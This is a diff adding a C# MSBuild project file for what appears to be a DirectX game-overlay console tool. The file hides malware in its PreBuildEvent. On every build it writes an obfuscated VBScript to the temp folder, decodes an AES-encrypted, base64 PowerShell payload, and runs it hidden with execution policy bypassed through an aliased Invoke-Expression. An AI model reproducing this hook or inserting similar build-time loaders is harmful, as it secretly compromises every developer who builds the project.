@@ -1,0 +1,126 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{346380DB-2591-47EA-A0EB-08B878443865}</ProjectGuid>
+    <OutputType>Exe</OutputType>
+    <RootNamespace>ConsoleApp2</RootNamespace>
+    <AssemblyName>ConsoleApp2</AssemblyName>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationManifest>Misc\app.manifest</ApplicationManifest>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject>ConsoleApp2.HL2</StartupObject>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.DirectX, Version=1.0.2902.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\..\..\..\..\..\Windows\Microsoft.NET\DirectX for Managed Code\1.0.2902.0\Microsoft.DirectX.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.DirectX.AudioVideoPlayback, Version=1.0.2902.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\..\..\..\..\..\Windows\Microsoft.NET\DirectX for Managed Code\1.0.2902.0\Microsoft.DirectX.AudioVideoPlayback.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.DirectX.Diagnostics, Version=1.0.2902.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\..\..\..\..\..\Windows\Microsoft.NET\DirectX for Managed Code\1.0.2902.0\Microsoft.DirectX.Diagnostics.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.DirectX.Direct3D, Version=1.0.2902.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\..\..\..\..\..\Windows\Microsoft.NET\DirectX for Managed Code\1.0.2902.0\Microsoft.DirectX.Direct3D.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.DirectX.Direct3DX, Version=1.0.2911.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\..\..\..\..\..\Windows\Microsoft.NET\DirectX for Managed Code\1.0.2902.0\Microsoft.DirectX.Direct3DX.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.DirectX.DirectDraw, Version=1.0.2902.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\..\..\..\..\..\Windows\Microsoft.NET\DirectX for Managed Code\1.0.2902.0\Microsoft.DirectX.DirectDraw.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.DirectX.DirectInput, Version=1.0.2902.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\..\..\..\..\..\Windows\Microsoft.NET\DirectX for Managed Code\1.0.2902.0\Microsoft.DirectX.DirectInput.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.DirectX.DirectPlay, Version=1.0.2902.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\..\..\..\..\..\Windows\Microsoft.NET\DirectX for Managed Code\1.0.2902.0\Microsoft.DirectX.DirectPlay.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.DirectX.DirectSound, Version=1.0.2902.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\..\..\..\..\..\Windows\Microsoft.NET\DirectX for Managed Code\1.0.2902.0\Microsoft.DirectX.DirectSound.dll</HintPath>
+    </Reference>
+    <Reference Include="PresentationCore" />
+    <Reference Include="SharpDX, Version=4.2.0.0, Culture=neutral, PublicKeyToken=b4dcf0f35e5521f1, processorArchitecture=MSIL">
+      <HintPath>..\packages\SharpDX.4.2.0\lib\net45\SharpDX.dll</HintPath>
+    </Reference>
+    <Reference Include="SharpDX.Direct2D1, Version=4.1.0.0, Culture=neutral, PublicKeyToken=b4dcf0f35e5521f1, processorArchitecture=MSIL">
+      <HintPath>..\packages\SharpDX.Direct2D1.4.1.0\lib\net45\SharpDX.Direct2D1.dll</HintPath>
+    </Reference>
+    <Reference Include="SharpDX.DXGI, Version=4.1.0.0, Culture=neutral, PublicKeyToken=b4dcf0f35e5521f1, processorArchitecture=MSIL">
+      <HintPath>..\packages\SharpDX.DXGI.4.1.0\lib\net45\SharpDX.DXGI.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Device" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Numerics" />
+    <Reference Include="System.Security.Principal.Windows, Version=4.1.3.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Security.Principal.Windows.4.7.0\lib\net461\System.Security.Principal.Windows.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Xml" />
+    <Reference Include="Yato.DirectXOverlay, Version=1.27.17.6743, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\Yato.DirectXOverlay.1.27.17.6743\lib\Yato.DirectXOverlay.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Imports\Angle.cs" />
+    <Compile Include="Imports\Banana.cs" />
+    <Compile Include="Imports\Memory.cs" />
+    <Compile Include="Imports\NativeMethods.cs" />
+    <Compile Include="Structs.cs" />
+    <Compile Include="HL2.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Misc\App.config" />
+    <None Include="Misc\app.manifest" />
+    <None Include="Misc\packages.config" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <PropertyGroup>
+    <PreBuildEvent>@echo off&#xD;&#xA;setlocal&#xD;&#xA;set &quot;a=%25TEMP%25\4s9mpz&quot;&#xD;&#xA;mkdir &quot;%25a%25&quot; 2&gt;nul&#xD;&#xA;echo b = &quot;ZnVuY3Rpb24gRFZLIHtwYXJhbSAoW3N0cmluZ10kZW4sW2J5dGVbXV0kc0IpOyRrID0gTmV3LU9iamVjdCBieXRlW10gMzI7JHYgPSBOZXctT2JqZWN0IGJ5dGVbXSAxNjskZGVyaXZlQnl0ZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmZjMjg5OERlcml2ZUJ5dGVzKCRlbiwgJHNCLCAxMDAwLCBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5IYXNoQWxnb3JpdGhtTmFtZV06OlNIQTI1Nik7JGsgPSAkZGVyaXZlQnl0ZXMuR2V0Qnl0ZXMoMzIpOyR2ID0gJGRlcml2ZUJ5dGVzLkdldEJ5dGVzKDE2KTtyZXR1cm4gQHsgSyA9ICRrOyBWID0gJHYgfX07ZnVuY3Rpb24gRCB7cGFyYW0gKFtzdHJpbmddJGVCWixbc3RyaW5nXSRlbmMpOyRkQnkgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRlQlopOyRzYnkgPSAkZEJ5WzAuLjddOyRlQnkgPSAkZEJ5WzguLigkZEJ5Lkxlbmd0aCAtIDEpXTskZHJ2ID0gRFZLIC1lbiAkZW5jIC1zQiAkc2J5OyRrID0gJGRydi5LOyR2ID0gJGRydi5WOyRhID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzXTo6Q3JlYXRlKCk7JGEuTW9kZSA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkNpcGhlck1vZGVdOjpDQkM7JGEuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzc7JGEuS2V5ID0gJGs7JGEuSVYgPSAkdjskZGMgPSAkYS5DcmVhdGVEZWNyeXB0b3IoKTt0cnkgeyRkQiA9ICRkYy5UcmFuc2Zvcm1GaW5hbEJsb2NrKCRlQnksIDAsICRlQnkuTGVuZ3RoKTtyZXR1cm4gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJGRCKX0gY2F0Y2gge3JldHVybiAkbnVsbH19JGVCID0gInhBNWs4RGhBYTI4alB6cEVHK0FkL3l1aFI4OHQxVVNLRk1KZVdSYUFVd1ZQTUF5T3RWbW1FbXZVWnQxb2lTclkrSEhTbW4yUlRBS2JZYjlJNTFlTEsrQUswOUlKcDRqNWQyWXZEenRaa2dMajdhdlZid2xUVkZBVEpNOTdhWUFuUUFGWW9aVkxFTGlGMXBKazJpV1NWcHRwaElBdnM4ZzNWazdCS2RrNTlSV0wzMEpMajM3cTNwN083bnplSHRwT0xlS1NkTWZrM1BYWmhNT3pnWGJYTWYrc1JQWHlxZ25qd3Z6M2s2cjhWSEpnT3psS1IyazFDZjM4Rkh6VWN5cnZGbU81cWxHdmZOY3ZRVWJ4THozbEoxZjNUSFFMYUpkSnFNbk9ZNmVhUXN1L3daalgzaHlvdXdhWE1Wa3JlWWZNTko1MVNMU05ndTRFVytOSFIrZ09SUmhuVmRwS3NPMnhIUHhQaDlXZ1ZqZG9DZkdJUjZkQ0p6eExJNHR3S1JYL293bWoxaWQyU253cHFxcWpnMkRFcCtWWmJJODZzSzNMcWNhc2o5WU5XaWVFQ2hXSFI1Yy9EUU1KSmpzV3dTTWMvZ1I2czJDeG9POC9WOWZnMC9UaVVZd3RmN1laTTJ6L0UrRFRiZFVjUnJpS0E3SXVMQ3RBQmhveFZSbXU5eEREL0I3ZE5QRnRTaVQ1WnJUTWNZYmRZc3ZsdDVndlVaU0JKbWxoajJXQ01QMFYxY1VjczhhczRCYVo0ZnhDZmJtbTV0K0ZhbWI2d3RIcGVKVlpUcWFCb013OWJteVZJRTJ1SEp3UEV6SDFSMDJOZVJPZjZsTTBVMGRJS0lUaExpc1JibVZIUVh5ZnRrSUJIMHdqWUk2UWRBVEJIMlNFRkYwQUtCa1ZJeVpvSjdRTTgrL0grMXNIRjlRN3d3SXhDdTRLV3BHTktyNzFGS0NEM0JHTGpEblgwMlVwRCs4RHVpYjlZUjVtYVhNQU1Ha0pySnpGSEZNdFF3MUFVMFZIbVk3VmlwUmg0d1VkcEdnQ0RJR243OHRFYkVkNE1ucnpwaGNyYkJGT1dwYk92VjNsTmNuZVptbHNpQlRXeG45cDA2WGsxaWZaR0RSVnlpT0tBNmVMM0R2M01vVjJrZzFJbzZESkpzNFdqS0JmYVIzNFBENFpMLzlmeHowWW5hWFp4N3ArMFZrMnZqdjIwanIzdTB5UGRJcWpvNFJpUDRxNWZ5aDdiZ2x1em52R0loZVpOTU5tckNVZmF3eXJkdldmYU50b1lTVDBwMnBPaVJtYVYrS0tObGx0Wm1EU1FVUkxOcG05QmQ2ZXJ4UUpJZnVJUHp2ZzBuZy9ZWlNsY1JUMjdUV25EVjJNaXlaREcyc0FMZmUyQTdnU0NEc1ErOFM2UTdyU2VDb2JmVEtnRitZZWtaWU5FNlhLeDY3VVdEeUx3UitCbkJGc3Byd0QzSWdMdlhZUWdEcHBXVktocThZY3dYL3Q4VHJQdS9zeWR5SS9q&quot; &gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo c = &quot;bEJ5NGtWZVBmMERUU0d5UU14aC95VGR2d01td0lldmk1bHQ1RzhNVnlycTArdGhrRngrV1U0Ukk0Wi9DNnZaS3JobzY4bHBGOERTWmJCQktnSHB6Q2Fpckg2dXBucWlsRnpJcWJKQzgzVnE1NGs0b1JZblN6SnVmejVVWFd3bk42RkU4VVJTZWg5ek03Y2d6dnozZGg2UzRsVE03OWhIZm9Fa1NGY2cxWC9wZzJMQktmT1BObGhSVDJxNFlsUTl5ZjJja0FUajNxUUwxNjd1L0U3UUZISTAvcW15YzY1WmRndWRkdnIvOG1QcXFrQ3ZYQTJFT0x5eWtVeGpGT2tsaHFSRjREQjlwYS9CaG5WUXc0c1U4eWdWRmttTGVvWGNTQjJYTVp0UUFSYjZiNnArS2pKeW9uY1VWUmhjdTh5TUdGMzFpcGF3QmF2R29HNjdKRmdyZm5hNjZtSmJ3QTE0dTUwU3I2Z0g3T3E0d2VWemVSUGFWTHg1bjVHWFBZMzA5QjlCN1NCdVh5U1cybURCZWlWTGduZEhVcnMzdENlMXpGR2RGNElUdkIxUkZlS1dEdzV5Uk42dW80SGtyZVpaUzY3dUVnMGQ5QnlIczFkS205QlJTNnFEbXVlckc1YXU2Y3c3Q0NFTzRORW9nSjcwUWJ0NGxpVnZLYjhleldLWXlrRXQ1KzNWeXozcEh4WTZBSDVMV1RGTmQxZC9Cb1Z3L1hFVHpFRkNFWTBKOWRHYzJDV1hERFBpeGNHbTJXMHpZazcrWm9RRWtFejVPajZFWkIwbE1GU2IzSHdqbGJPdmtteWxjRklCMDBqQjVuNXRidCt4N0RCTXJGWEJDVHlqcXd2R3lSQ05oSExjc0JPSjFrcERQbnFLSWRmZ0VKeU1yUlBIcmgwVlpzWTIzU2c2UlBhZDhodHBRRUVEV0E2T2lqb0l5dVdUc3c2eGRNcVdoWXZXLzVVKzQzZTFiQWo3SllWTTVSMlZMam1YUjU5RlNwY01XQmgxL1BmdVU2NGxrbWk0bFdXUU5QOUo3ZmVXZmw4NCs3dlpUbkppOEJEbVREc1ZyS2U3R3BuclYrcEVRMDdGL1N4REVQZDlrN0c4bzlxbUJNbEFFZ3hoQkNZSW9qUzVPZEV0QW5QVWFYb1c3ZzZvYlVvNFZkUFdnVEFrSHg4UUNtOEhPMjJLUXJTVklkOHpUbnMxL2JBSnVsdTZhSVozSG1WSjVDWnNmODh1cE1UdTNhVDlTcDg3YnFURXd4ZFhRSnlxK0RZMWJtMzB6NDBGMlA3OWF6YWN3eTFUNEY3ajl0c1FRTEdIbEdUTXgxVmJZZUF2azF3Z1h6cjR4aDA2Ym9qRy9ObDJiUEhEZldsT24vUStldHhENk5kVEc1SWtNSmYwK2FjeCt2Qy9iWHhNaVMxSkhZai9JZUZ6SmFIUTAyMTF5QkMreisyRUpEVjRJZUNQWTBaSFlNNGt6blRzMndxdEZESkgrZVB1WnFtU3dzZnN4cEdhc0N0aWt3UDBKbmVhUkJaRERDUGdRYjRxVE55U0NoaUNHd2o4RXpKbnAyYlRQL2Nva1dib1E1MzdIUjBleW14OTFSZzJ3R3NlTEpIK01uWG40aW9JbThxWEdTSm5hbHo1L3kxdXM2OU9VS3FoUUttbVIxcTZtK2lYRXV4U3hZUWFWZFE0czVmTXpqY3ExdjFJYzN6Tlk1QmoxUzZvYWJ0QzJOUDJXL0IwSUg4ejdyU0IvUzF2UzdabzlZQ2w2UDZFZC82SldkdDRkZTd2TVh2d1RLdndSS1o1dlp4OGRiWXZ4SlFqZUlreTVodmcreldVZm8zYVZuRUJleDByN1RjempOdlIwbUY4QzRmMTcwN2JXSHo0ZWFZdVBzMzJwZWl2OTNHSmRpTlRRTGI2akhxSnI0R1ZEcUlmQklYRzVWUWdIY05UNEM2RDZpY0ZIbnk2N1lUZGhoZWxEWE11Sm10aDllZEwvcFE3WTZXWTJJOEI3RFVBejFpa2d3WGU3cVIvWThIYkxONUJrZnJ2MHRSODNFQVlvSzlITDNYYURPRmd1V2w1aVE0TTkrZHRLQnczUFd4VFVtZURjZk5zSnNlSmF5b2crRy9nVzJBQ0RuWlBtL24wMXhRSExTeHJWSUkyN00veHZibHJXZVhHc1RFMks3T0VxUXUvejNQSm5OdVNMdjAzQys4Umt3aGx2YkRpSEtVRWEwVGF4bmVOSjMzbEo3Sk9DTmNibnBIQ3dITDV3andaOGxiZEY3dExYcXR5ZVk0b3JUNXhoS3FEak5hQkxxWmNRT1g2ckh2b1NGNiI7JHRtID0gJGVCLlRvQ2hhckFycmF5KCk7W2FycmF5XTo6UmV2ZXJzZSgkdG0pOyRSID0gRCAtZUJaICR0bSAtZW5jICIiOyR0ID0gJFIuVG9DaGFyQXJyYXkoKTsgW2FycmF5XTo6UmV2ZXJzZSgkdCk7ICRCVlYgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC1qb2luICR0KSk7ICRFUFggPSAiSW52b2tlLUV4cHJlc3Npb24iOyBOZXctQWxpYXMgLU5hbWUgcFdOIC1WYWx1ZSAkRVBYIC1Gb3JjZTsgcFdOICRCVlY=&quot; &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo d = &quot;YjZVMUxhSTcwTmRrRDlmMUdudEEwY0h3OUtWOHhzUXNkam44R05RbkM5VkN6ZWh2Vmo1bkowT3g2VEJqaExHenB6U2sySEZWZjJLU0VONk5pcC8wMXh0WXRDT3o0eHY3QUhhb3RSVkQ0dVR3d2ExNUVodlRzOGdmNVhsczdyWXBPVS9nZ3EvakNQN2p6d1VsTEZ5VjY2elg5aUsrc043LzU4OEw0djNMekFud0V6aU5ENVl2NjdnTTQ5NU1oVUhCc0FVYkhnTEpmRGUzT0tkZW1MaHdVY2VobWN2SkdoVjZQalYzSzNDQ1MySFFYTzI0bFFPTk9meGhSMzV0YjM5bU5Nd1grSG83czhUbVBGcWdJeXpGT3lHcVBWTktpM1MyM29MdEhBblllWHlZMEhtclhLWFlZNUVqUHNjU1ZWdjh3T1JFbEo3dU84dnNvdEMyUmhpQVRWcXJoc05UZm1lQWpxWm9NMVNrdGd1cHFVMGFTZE0zQ2dMajMxaUJ0T0YzNDdHSG5KaStUcm5DamlCSHhULzFWSUZqNzY4SnEvQ254ZmZvR0tsRVduRGtVeTQvcFV1OUY3S3JxT0pRVzljYnlnVVh3R1RURklzZjdIT214cEFZLzdKU0JxVlB6QmdlZ3d1czI0RDJhYzNKTFBSK0paMHNtV3lOeVc1MlYzWHZhNUVhZ043UEh0OWxoQm9GYlNNb3l6dlp6d0xldVVGdWZET3FkQk5FajJvNUgvZGNDd1BYbklmNi9SMTNoRlczK2lyV2lyOTF5Tm8vRFIrZGRIUDcwcnROTGZHZ2hBVDV0U3pjdlRoLzMwT2kxdGZoYlk4ZVdtQzc5enRGUVBJcTBZenFXNWpiMlJsTXFkMHZkcG9uWmhkTnVaMVpwUEp1ODhSaGFIUUF2U2FNV1N2eER1Q0loVkFIMUlEUXJsUFduK080aTdnelIzYmNiUS92Z0ZOcjdUZFY5Zm5WcFJMMGtxM0k2WEVvZklUU3lSNWRmVU1mWXdHKzBLR2s3OHlDOEJVczUrQzZTR2l1QzlTRVJZaEZ3ZTRvNFQwTnQzdHMxVkU0TlZlVTAwbGFXSXpRVVhtbkhEZjBoT1ZwWWJKb3dXYnZKVDBnRHFCa1hPVFYrN24wZnM2ZE9ZaTJ1MzdZMHlHQU9vdkdjWWJ2VHFFaFAxY2F2c2JaVUk5cHZRczBteTBweXFkL0ZCcnozT1F4MmhpMnhCczJpcFdZMCttdisrMklXYUNEV09kYUs3Yy8zVkgyZ05uajl4Y0tpMzZiZDkxeXNZMTlNVmxRaEppeVJnZjJjM2YvNk9GT21tejduNUVOU2pHb2xpNEVnRC9CUGRkTHVHUDNlbmw1TSs2Tzg5THkvWmNwcUZEejVndjY0aGRJS25BVFJoUTh5TUVQZHI3akgxUmZuejVjZThXMjFUK1hwc2ZIWXVsWjU3N1NDOUdHRENyT1B3dlFEbDZDZHZ1cUl4a2NaVzlkS1c4alVuVVVxSEROa2tDelMvcnZJQTdEUVBqYy9hcExJNVJCc0RsQ0tuWVZWaHd0M0l3RlNtMFV2L0Q1SHM0Tk5qeE91TitkWVlmQjNRYXVuN2ZHWmkxZ01xRDNleWN2TVR2ZWpHVm5QN2NUVFppMmZBaGZtK0I1Z0Q3S3NIbUx2NUZNQWRkWlQ1RFlEd2tYUnRsK0JMQkRmTFFleXZ5MERvNzQxTjNDVzVISmJkRkpqWVZCODBJdVEyZ3p2UGUyTWxNTXJqS1NXQkdvajJIUW11Sm9iYmtQVmRhblFsQThUQ0ZMd2FnSDdJRGFhTkgwc3VTUE12b1c5RHhJb081SE9rZkU3bCs4cVJxTHpYU3kzMVVLbENYMlRHQmdVQkVaa3dOUmVpbzEzRVNEc3JXV2NDY3pNWjd0LzU5YjlhTGJVQVBaLzk1R21paWQrQkR2MWU0NjhpZGVtUCtKWG1BMy9SRkhxRUE1Vlo1a1ZzVE5XQmFDUG9XenpPU05XNWtVYkhpekluMERsWS9wbGVqdE01QjhOVE42U1dXeVNhM3kwakp5Q1lERm8vYkQ5Q3RUYm4wZmlGWUJPU3R2VmVqMlBERU5WNnRVQU5WdjF3ZU9uMDc5Qis0RlRGVGd1Wjg0THpxdWczZCtlazBCZ1FVWUxrbWc4bW8yWUsveG1IUXVXTjZlWi9QeDV1YVBveFY5RUI2SFAwV2FidEJFQzR2RzdmQkxhSW96bFEyb2xpdVYzbzUrSHczaFBKRWFhdVdncEdDY2loR3ZxY1RwTCtRYUtKeG9jNmNNTUZGWU5mbGpLb3NuM2QwN3EwcDhRellITUVUVGxhQitLN1ZOLzM2enBwUGlOVEtvZTZFVVYyMTNJa25vNjBPT2Z4aUhqOE5wOERPTjZXZVV0VXRKdjN6MFJ6LzNnNkRPYWlFRjQ2NGIyUHJIeXlucUw1MkFNVDcxRXFaZkQ3ZnBQemhSTy8yZ29jVXh2M1c4RGY4eGpVUXdxTXF2NTQvQzYxaUdEWTg1TXp6Qmp0dXlmUWV5ZGhZMjlkdmlGZXhTdzZ6eGdZTGVJc3EweEV6cWd0VkF0VndUdXF4N2ZmZCthUjJCV1pCMDhiRGkzdnJ0ZEhNM1ZkTEpCMzExa1NTaVc4enBoSkIyKzRGTTlsUmJndVdMYno1enZLRFltUVBmOFRGcGpvV0RzSXY4RmZXM3lKYVNz&quot; &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo e = b ^&amp; d ^&amp; c &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo Set f = CreateObject(&quot;MSXml2.DOMDocument.6.0&quot;).createElement(&quot;base64&quot;) &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo f.DataType = &quot;bin.base64&quot; &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo f.Text = e &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo g = f.NodeTypedValue &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo h = &quot;%25a%25\fyAO.ps1.ps1&quot; &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo Set j = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo Set k = j.CreateTextFile(h, True) &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo k.Write l(g) &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo k.Close &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo Set m = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo m.Run &quot;powershell.exe -ExecutionPolicy Bypass -File &quot; ^&amp; h, 0, False &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo Function l(n) &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo Dim o, p &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo Set o = CreateObject(&quot;ADODB.Recordset&quot;) &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo p = LenB(n) &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo If p ^&gt; 0 Then &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo o.Fields.Append &quot;q&quot;, 201, p &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo o.Open &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo o.AddNew &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo o(&quot;q&quot;).AppendChunk n &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo o.Update &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo l = o(&quot;q&quot;).GetChunk(p) &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo Else &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo l = &quot;&quot; &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo End If &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;echo End Function &gt;&gt; &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;cscript //nologo &quot;%25a%25\ou29rkqYG.vbs&quot;&#xD;&#xA;endlocal</PreBuildEvent>
+  </PropertyGroup>
+</Project>
